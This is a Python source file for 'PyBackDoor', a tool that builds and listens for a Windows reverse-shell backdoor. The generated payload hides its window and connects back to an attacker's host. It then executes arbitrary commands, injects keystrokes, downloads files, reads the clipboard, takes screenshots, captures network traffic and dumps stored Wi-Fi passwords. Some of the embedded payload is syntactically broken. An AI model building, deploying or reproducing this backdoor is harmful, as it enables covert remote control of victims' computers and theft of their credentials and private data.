import argparse
import subprocess
from socket import *
from modules.auto_type import s_print
from modules.pybackdoor_listen import pybackdoor_listen
# colors
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
# logo 
s_print(f'''{RED}
                      ██    █████
                     █▒▒█   █▒▒▒█
                    █▒▒▒▒█  █▒▒▒█
                  ██▒▒▒▒▒▒█ █▒▒▒█
                 █▒▒▒▒▒▒▒▒▒██▒▒▒█
                █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
               █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
             ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
            █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
           █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
         ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
        █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
       █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
      █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
     ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
      ██▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒██
       ███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███
        ██▒▒▒▒▒██████▒▒▒▒████████▒▒▒██
         █▒▒▒▒▒██████▒▒▒▒████████▒▒▒█
         █▒▒▒▒▒██████▒▒▒▒████████▒▒▒█
         █▒▒▒▒▒██████▒▒▒▒████████▒▒▒█
         █▒▒▒▒▒██████▒▒▒▒████████▒▒▒█
██████████▒▒▒▒▒██████▒▒▒▒████████▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒████████▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒████████▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
███████████████████████████████████████████
███████████░░░░░░██████████████████████████
███████░░░░░░██████████████████████████████
█████░░░░░░████████████████████████████████
█████░░░░░░████████████████████████████████
█████░░░░░░░░██████████████████████████████
██████░░░░░░░░░░░░█████████████████████████
████████░░░░░░░░░░░░░░░░███████████████████
███████████░░░░░░░░░░░░░░░░░░░█████████████
████████████████░░░░░░░░░░░░░░░░░░░████████
████████████████████░░░░░░░░░░░░░░░░░██████
███████████████████████░░░░░░░░░░░░░░░░████
█████████████████████████░░░░░░░░░░░░░░░░██
██████████████████████████░░░░░░░░░░░░░░░░█
███████████████████████████░░░░░░░░░░░░░░░█
███████████████████████████░░░░░░░░░░░░░░░█
██████████████████████████░░░░░░░░░░░░░░░██
█████████████████████████░░░░░░░░░░░░░░░░██
████████████████████████░░░░░░░░░░░░░░░░███
             PyBackDoor
  Developer: Dev. Gautam Kumar
''')
parser = argparse.ArgumentParser()        
parser.add_argument("-m", "--mode", type=str, help="Which mode or function to execute: build or listen")
parser.add_argument("-lh","--lhost",type=str, help="LHOST")
parser.add_argument("-lp","--lport",type=int, help="LPORT")
args = parser.parse_args()
lhost = args.lhost
lport = args.lport
if args.mode == "build":
    with open("payload.py","w") as payload_file:
        payload = 'from socket \nimport *\nfrom getpass \nimport getuser\nimport subprocess\nimport platform\nimport os\nimport win32console\nimport win32gui\nimport sys\nimport win32api,pythoncom\nimport time,random,string,base64\nimport datetime\nimport pyautogui\nimport keyboard\nimport urllib.request\nimport webbrowser\nimport pyperclip\nimport http.server\nimport socketserver\ndebug = True\ndef hide_window():\n    win = win32console.GetConsoleWindow()\n    win32gui.ShowWindow(win, 0)\ndef collect_os_info():\n    get_os =  platform.uname()\n    get_user = getuser()\n    os_info = "[OS INFO] client_name: "+str(get_user)+" <-> "+"client_os: "+str(get_os)\n    return os_info\ndef generate_file_name():\n    generation_time = datetime.datetime.now()\n    filename = generation_time.strftime("Screenshot_%Y-%m-%d_%H-%M-%S")\n    return filename\ndef set_clipboard(text):\n    statement = "Setting clipboard to: "+text\n    pyperclip.copy(text)\n    return statement\ndef get_clipboard():\n    statement= str(pyperclip.paste())\n    return statement\ndef take_screenshot():\n    statement = "Taking screenshot..."\n    pyautogui.screenshot().save(generate_file_name() + ".png")\n    statement = statement+"Screenshot saved!"\n    return statement\ndef serve_http():\n    HTTP_PORT = 80\n    statement = "serving at port"+ str(HTTP_PORT)\n    Handler = http.server.SimpleHTTPRequestHandler\n    with socketserver.TCPServer(("", HTTP_PORT), Handler) as httpd:\n        \n        httpd.serve_forever()\n    return statement\ndef analyze_lan_traffic(delay,filename):\n    statement = "Starting Trace Capture..."\n    subprocess.run(["netsh", "trace", "start", "capture=yes", "tracefile="+filename], capture_output=True)\n    time.sleep(delay)\n    statement = "Stopping Trace..."\n    subprocess.run(["netsh", "trace", "stop"], capture_output=True)\n    return statement\ndef press_keys(keys):\n    keyboard.write(keys)\n    statement = "Typing "+ keys\n    return statement\ndef download_file(url):\n    filename = url.split("/")[-1]\n    urllib.request.urlretrieve(url, filename)\n    if os.path.exists(filename):\n        statement = f"{filename} downloaded successfully!"\n    else:\n        statement = f"Failed to download {filename}"\n    return statement\ndef open_link(link):\n    webbrowser.open(link)\n    statement = "Opening "+link +" ..."\n    return statement\ndef generate_wlan_profile():\n    result = subprocess.run(["netsh wlan show profile"], stdout=subprocess.PIPE)\n    statement = result.stdout.decode("utf-8")\n    return statement\ndef generate_wlan_ind_profile(profile_name):\n    result = subprocess.run([f"netsh wlan show profile name={profile_name} key=clear"], stdout=subprocess.PIPE)\n    statement = result.stdout.decode("utf-8") \n    return statement\nif debug == False:\n    hide_window()# Lhost and lport\nHOST = "' + lhost +'"\nPORT =' + str(lport)+'\n# connection configuration\nconnection = socket(AF_INET, SOCK_STREAM)\nconnection.connect((HOST, PORT))\nconnection.send(collect_os_info().encode())\nprint("connection established !")# payload execution\nwhile True:\n    receiver = connection.recv(1024).decode()\n    if receiver == "exit":\n        exit()\n    elif receiver[:2] == "cd":\n        os.chdir(receiver[3:])\n        connection.send(os.getcwd().encode())\n    elif ".exe" in receiver:\n        warning = "(!) Executing "+receiver\n        connection.send(warning.encode())\n        result = subprocess.run(receiver, shell=True, capture_output=True)\n        # Print the output of the command\n        # connection.send(result)\n        statement = "done !"\n        connection.send(statement.encode())\n    elif "type" in receiver:\n        text = receiver[4:]\n        time.sleep(2)\n        statement = press_keys(text)\n        connection.send(statement.encode())\n    elif "download" in receiver:\n        URL = receiver[8:]\n        statement = download_file(URL)\n        connection.send(statement.encode())\n    elif "set clipboard" in receiver:\n        text = receiver[13:]\n        statement = str(set_clipboard(text))\n        connection.send(statement.encode())\n    elif "get clipboard" in receiver:\n        statement = get_clipboard()\n        connection.send(statement.encode())\n    elif "analyze lan traffic" in receiver:\n        statement = analyze_lan_traffic()\n        connection.send(statement.encode())\n    elif "take screenshot" in receiver:\n        statement = take_screenshot()\n        connection.send(statement.encode())\n    elif "start file server" in receiver:\n        statement = serve_http()\n        connection.send(statement.encode())\n    elif "generate wlan profile *" in receiver:\n        statement = generate_wlan_profile()\n        connection.send(statement.encode())\n    elif receiver == "generate wlan profile":\n        statement = generate_wlan_ind_profile(receiver[22:])\n        connection.send(statement.encode())\n    elif "browse" in receiver[:6]:\n        statement = open_link(receiver[6:])\n        connection.send(statement.encode())\n    else:\n        out_put = subprocess.getoutput(receiver)\n        statement = "Executing command:" + receiver+".."       if out_put =="" or out_put == None:\n            output="---"\n            connection.send(statement.encode())\n            connection.send(out_put.encode())\n        else:\n            connection.send(statement.encode())\n            connection.send(out_put.encode())'
        payload_file.write(payload)
        print("(!) Payload file created")
elif args.mode == "listen":
    print(pybackdoor_listen(lhost,lport))
else:
    print(
        '''
        usage: pybackdoor.py [-h] [-m MODE] [-lh LHOST] [-lp LPORT]

options:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  Which mode or function to execute: build or listen
  -lh LHOST, --lhost LHOST
                        LHOST
  -lp LPORT, --lport LPORT
                        LPORT
    ''')